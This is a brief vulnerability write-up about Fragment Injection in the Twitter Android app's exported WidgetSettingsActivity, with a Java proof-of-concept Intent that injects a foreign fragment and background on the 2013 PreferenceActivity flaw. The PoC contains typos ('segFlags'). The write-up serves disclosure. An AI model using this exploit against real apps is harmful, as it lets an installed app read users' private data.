# 组件-twitter
twitter android app Fragment Injection

com.twitter.android.WidgetSettingsActivity extend PreferenceActivity and export.

PoC
private void testtwitter(){
	intent i = new Intent();
	i.segFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
	i.setClassName("com.twitter.android","com.twitter.android.WidgetSettingsActivity");
	i.putExtra(":android:show_fragment","com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment");
	startActivity(i);
}

Install an app, in the case of non-root can obtain private information

# Cause
news in 2013 
A New Vulnerability in the Android Framework: Fragment Injection.
vulnerability: Settings,Gmail,Google Now,DropBox and Evernote.
Any App which extended the PreferenceActivity class exported was automatically vulnerable.it is due to the Android KitKat patch which requires applications to override the new method, PreferenceActivity.isValidFragment,

# Twitter不安全存储
